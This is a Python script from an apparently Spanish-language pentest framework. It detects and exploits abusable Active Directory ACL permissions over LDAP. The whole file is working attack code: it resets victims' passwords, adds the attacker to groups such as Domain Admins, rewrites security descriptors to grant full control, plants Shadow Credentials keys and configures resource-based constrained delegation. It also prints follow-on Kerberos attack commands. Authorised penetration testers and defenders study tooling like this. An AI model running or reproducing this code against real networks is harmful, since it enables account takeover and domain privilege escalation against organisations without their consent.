# scripts/ldap/attack/acl-abuse.py

from scripts.base import BaseScript
from core.output import print_result, print_table, console
from core import session_db

try:
    from modules.ldap import LDAPModule
    _LDAP_AVAILABLE = True
except ImportError:
    _LDAP_AVAILABLE = False


class Script(BaseScript):
    name        = "acl-abuse"
    protocol    = "ldap"
    category    = "attack"
    description = (
        "Detecta y explota permisos ACL sobre objetos AD: "
        "GenericAll → reset de contraseña o añadir a grupo; "
        "GenericWrite / WriteProperty → escribir atributos (shadowCredentials, RBCD); "
        "WriteDACL → añadir ACE propia; "
        "AddMember → añadir usuario a grupo privilegiado."
    )
    requires_auth = True

    EXAMPLES = [
        {
            "flag":  "--source-user / --target-obj",
            "desc":  "Cuenta atacante y objeto víctima (DN completo)",
            "good":  "lobera.py ldap --script=acl-abuse -t 10.129.1.5 -u iker -p 'Pass1' -d CORP.LOCAL --source-user iker --target-obj 'CN=Domain Admins,CN=Users,DC=corp,DC=local' --action add-member",
            "bad":   "lobera.py ldap --script=acl-abuse -t 10.129.1.5 -u iker -p 'Pass1' -d CORP.LOCAL  [sin --action solo detecta, no explota]",
        },
        {
            "flag":  "--action",
            "desc":  "Acción a ejecutar: detect | reset-password | add-member | write-dacl | shadow-creds | rbcd",
            "good":  "lobera.py ldap --script=acl-abuse ... --action detect  [solo muestra ACEs abusables sin tocar nada]",
            "bad":   "lobera.py ldap --script=acl-abuse ... --action reset-password  [sin --new-password se genera una aleatoria]",
        },
        {
            "flag":  "--new-password",
            "desc":  "Contraseña nueva al usar --action reset-password",
            "good":  "lobera.py ldap --script=acl-abuse ... --action reset-password --target-obj 'CN=admin,...' --new-password 'Lobera2024!'",
            "bad":   "lobera.py ldap --script=acl-abuse ... --action reset-password  [si no se da, se genera una aleatoria de 16 chars]",
        },
    ]

    def run(self, **kwargs):
        if not _LDAP_AVAILABLE:
            print_result("LDAP", str(self.target.ip), "fail",
                         "modules/ldap.py no encontrado")
            return None

        action      = kwargs.get("action", "detect")
        source_user = kwargs.get("source_user") or self.creds.user
        target_obj  = kwargs.get("target_obj")
        new_password= kwargs.get("new_password")

        ldap = LDAPModule(
            self.target, self.creds,
            use_ssl=kwargs.get("ldaps", False),
            port=kwargs.get("port"),
        )
        if not ldap.connect():
            return None

        try:
            if action == "detect":
                return self._detect(ldap, target_obj)
            elif action == "reset-password":
                return self._reset_password(ldap, target_obj, new_password)
            elif action == "add-member":
                return self._add_member(ldap, source_user, target_obj)
            elif action == "write-dacl":
                return self._write_dacl(ldap, source_user, target_obj)
            elif action == "shadow-creds":
                return self._shadow_creds(ldap, target_obj, kwargs)
            elif action == "rbcd":
                return self._rbcd(ldap, source_user, target_obj)
            else:
                console.print("[red]Acción desconocida: {}[/red]. "
                              "Opciones: detect | reset-password | add-member | "
                              "write-dacl | shadow-creds | rbcd".format(action))
                return None
        finally:
            ldap.disconnect()

    # ------------------------------------------------------------------
    # Acciones
    # ------------------------------------------------------------------

    def _detect(self, ldap, target_dn=None):
        """Solo detecta ACEs abusables, no ejecuta nada."""
        aces = ldap.get_interesting_aces(target_dn=target_dn)
        if not aces:
            console.print("[yellow]No se encontraron ACEs abusables en los objetos analizados.[/yellow]")
            return []

        rows = []
        for ace in aces:
            obj_cn = ace["object_dn"].split(",")[0].replace("CN=", "").replace("DC=", "")
            rows.append((
                obj_cn,
                ace["trustee_sid"],
                ", ".join(ace["rights"]),
                self._suggest_abuse(ace["rights"]),
            ))

        print_table(
            "ACEs abusables detectadas",
            ["Objeto", "Trustee", "Derechos", "Abuso sugerido"],
            rows,
        )
        return aces

    def _reset_password(self, ldap, target_obj, new_password):
        """Resetea la contraseña del objeto objetivo usando GenericAll / User-Force-Change-Password."""
        if not target_obj:
            console.print("[red]--target-obj es obligatorio para reset-password[/red]")
            return False

        import os as _os
        import string
        import random

        if not new_password:
            alphabet    = string.ascii_letters + string.digits + "!@#$%"
            new_password = "".join(random.choices(alphabet, k=16))
            console.print("[dim]Contraseña generada automáticamente: {}[/dim]".format(new_password))

        # unicodePwd en UTF-16-LE con comillas
        pwd_encoded = ('"{}"'.format(new_password)).encode("utf-16-le")
        ok = ldap._modify(target_obj, [
            ("unicodePwd", "replace", [pwd_encoded]),
        ])

        if ok:
            print_result("LDAP", str(self.target.ip), "pwned",
                         "Contraseña de {} reseteada a: {}".format(target_obj, new_password))
            session_db.save_credential(
                str(self.target.ip),
                target_obj.split(",")[0].replace("CN=", ""),
                new_password, "password", valid=True,
                source="ldap_acl_abuse_reset",
            )
        return ok

    def _add_member(self, ldap, source_user, target_group_dn):
        """Añade source_user al grupo target_group_dn usando GenericAll / AddMember."""
        if not target_group_dn:
            console.print("[red]--target-obj (DN del grupo) es obligatorio para add-member[/red]")
            return False

        user_dn = ldap._user_dn(source_user)
        ok = ldap._modify(target_group_dn, [
            ("member", "add", [user_dn]),
        ])

        if ok:
            print_result("LDAP", str(self.target.ip), "pwned",
                         "{} añadido a {}".format(
                             source_user,
                             target_group_dn.split(",")[0].replace("CN=", ""),
                         ))
            session_db.save_finding(
                str(self.target.ip), "LDAP", "acl_abuse_add_member",
                "{} → {}".format(source_user, target_group_dn),
            )
        return ok

    def _write_dacl(self, ldap, source_user, target_dn):
        """
        Abusa de WriteDACL: añade una ACE GenericAll para source_user
        sobre target_dn, dando control total.
        """
        if not target_dn:
            console.print("[red]--target-obj es obligatorio para write-dacl[/red]")
            return False

        attacker_sid = ldap.get_sid(source_user)
        if not attacker_sid:
            print_result("LDAP", str(self.target.ip), "fail",
                         "No se pudo obtener el SID de {}".format(source_user))
            return False

        sid_bytes = LDAPModule._sid_str_to_bytes(attacker_sid)
        ace       = LDAPModule._build_allowed_ace(0x10000000, sid_bytes)  # GenericAll
        dacl      = LDAPModule._build_dacl([ace])
        sd        = LDAPModule._build_sd(dacl)

        ok = ldap._modify(target_dn, [
            ("nTSecurityDescriptor", "replace", [sd]),
        ])

        if ok:
            print_result("LDAP", str(self.target.ip), "pwned",
                         "WriteDACL: GenericAll añadido para {} sobre {}".format(
                             source_user,
                             target_dn.split(",")[0].replace("CN=", ""),
                         ))
            session_db.save_finding(
                str(self.target.ip), "LDAP", "acl_abuse_write_dacl",
                "{} → GenericAll sobre {}".format(source_user, target_dn),
            )
        return ok

    def _shadow_creds(self, ldap, target_obj, kwargs):
        """
        Abusa de GenericWrite / WriteProperty sobre msDS-KeyCredentialLink
        para añadir Shadow Credentials al objeto objetivo.
        Llama directamente al método de LDAPModule.
        """
        if not target_obj:
            console.print("[red]--target-obj es obligatorio para shadow-creds[/red]")
            return None

        try:
            from Cryptodome.PublicKey import RSA
        except ImportError:
            print_result("LDAP", str(self.target.ip), "fail",
                         "pycryptodomex no instalado (pip install pycryptodomex)")
            return None

        save_path = kwargs.get("save_key", "shadow_creds_{}.pem".format(
            target_obj.split(",")[0].replace("CN=", "").replace(" ", "_")
        ))

        # Generar par de claves RSA-2048
        key     = RSA.generate(2048)
        pub_pem = key.publickey().export_key("PEM").decode()
        priv_pem = key.export_key("PEM").decode()

        # Extraer sAMAccountName del DN
        target_user = target_obj.split(",")[0].replace("CN=", "").replace("cn=", "")

        key_id = ldap.write_key_credential(target_user, pub_pem)
        if not key_id:
            return None

        # Guardar clave privada
        try:
            with open(save_path, "w") as f:
                f.write(priv_pem)
            print_result("LDAP", str(self.target.ip), "ok",
                         "Clave privada guardada en {}".format(save_path))
        except OSError as exc:
            print_result("LDAP", str(self.target.ip), "fail",
                         "No se pudo guardar clave privada: {}".format(exc))

        console.print(
            "\n[dim]→ Siguiente paso (PKINIT para obtener TGT):[/dim]\n"
            "  lobera.py kerberos --script=pkinit "
            "-t {ip} -d {domain} -u {user} --cert {pem}".format(
                ip=self.target.ip,
                domain=self.creds.domain or self.target.domain or "DOMINIO",
                user=target_user,
                pem=save_path,
            )
        )
        return key_id

    def _rbcd(self, ldap, source_user, target_computer):
        """
        Escribe RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity) en target_computer
        para que source_user (o su cuenta de máquina) pueda impersonar a cualquier usuario.
        """
        if not target_computer:
            console.print("[red]--target-obj (sAMAccountName del equipo) es obligatorio para rbcd[/red]")
            return False

        attacker_sid = ldap.get_sid(source_user)
        if not attacker_sid:
            print_result("LDAP", str(self.target.ip), "fail",
                         "No se pudo obtener el SID de {}".format(source_user))
            return False

        ok = ldap.write_rbcd(target_computer, attacker_sid)
        if ok:
            console.print(
                "\n[dim]→ Siguiente paso (S4U2Self + S4U2Proxy):[/dim]\n"
                "  lobera.py kerberos --script=constrained-s4u "
                "-t {ip} -d {domain} -u {user} [credenciales] "
                "--target-computer {comp} --target-user Administrator".format(
                    ip=self.target.ip,
                    domain=self.creds.domain or self.target.domain or "DOMINIO",
                    user=source_user,
                    comp=target_computer,
                )
            )
        return ok

    # ------------------------------------------------------------------
    # Helper
    # ------------------------------------------------------------------

    @staticmethod
    def _suggest_abuse(rights):
        if "GenericAll" in rights:
            return "reset-password / add-member / shadow-creds"
        if "WriteDACL" in rights:
            return "write-dacl → GenericAll propio"
        if "GenericWrite" in rights:
            return "shadow-creds / rbcd"
        if "WriteOwner" in rights:
            return "cambiar propietario → WriteDACL"
        if "WriteProperty" in rights:
            return "shadow-creds / modificar atributos"
        if "ControlAccess" in rights:
            return "reset-password (si tiene ese extended right)"
        return "-"
